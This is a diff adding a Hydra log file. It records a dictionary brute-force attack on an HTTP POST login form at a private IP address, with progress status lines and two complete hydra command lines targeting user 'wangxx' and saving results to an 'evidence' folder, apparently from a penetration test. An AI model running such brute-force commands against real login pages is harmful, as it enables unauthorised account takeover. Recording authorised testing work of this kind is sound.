@@ -1,0 +1,9 @@
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-09 10:33:52
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 2798999 login tries (l:1/p:2798999), ~174938 tries per task
+[DATA] attacking http-post-form://192.168.100.101:80/dologin.html:httpd_username=^USER^&httpd_password=^PASS^:login.html
+[STATUS] 1366.00 tries/min, 1366 tries in 00:01h, 2797633 to do in 34:09h, 16 active
+The session file ./hydra.restore was written. Type "hydra -R" to resume session.
+# Hydra v9.5 run at 2025-09-12 14:23:11 on 192.168.100.101 http-post-form (hydra -l wangxx -P all8.txt -t 4 -w 10 -o evidence/html_hydra_results.txt -V 192.168.100.101 http-post-form /dologin.html:httpd_username=^USER^&httpd_password=^PASS^:302)
+# Hydra v9.5 run at 2025-09-12 14:28:40 on 192.168.100.101 http-post-form (hydra -l wangxx -P all8.txt -t 4 -w 10 -o evidence/html_hydra_results.txt -V 192.168.100.101 http-post-form /dologin.html:httpd_username=^USER^&httpd_password=^PASS^:302)
